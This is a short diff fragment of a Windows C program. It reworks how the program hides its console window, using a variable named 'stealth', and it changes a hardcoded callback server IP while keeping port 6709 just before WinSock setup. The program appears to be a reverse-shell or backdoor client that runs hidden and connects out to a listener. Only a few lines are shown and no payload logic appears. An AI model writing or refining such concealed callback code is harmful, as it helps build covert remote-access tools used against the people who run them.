@@ -536,14 +536,14 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     return 0;
   }
 
-  // Run without showing CMD window
-  HWND stealth;
-  AllocConsole();
-  stealth = FindWindowA("ConsoleWindowClass", NULL);
-  ShowWindow(stealth, 0);
+  // Run without showing CMD window (mwindows flag handles this)
+  HWND stealth = GetConsoleWindow();
+  if (stealth != NULL) {
+    ShowWindow(stealth, SW_HIDE);
+  }
 
   // Define variables
-  char *ServerIp = "192.168.1.65";
+  char *ServerIp = "192.168.64.1";
   unsigned short ServerPort = 6709;
 
   // Check if WinSock is ready
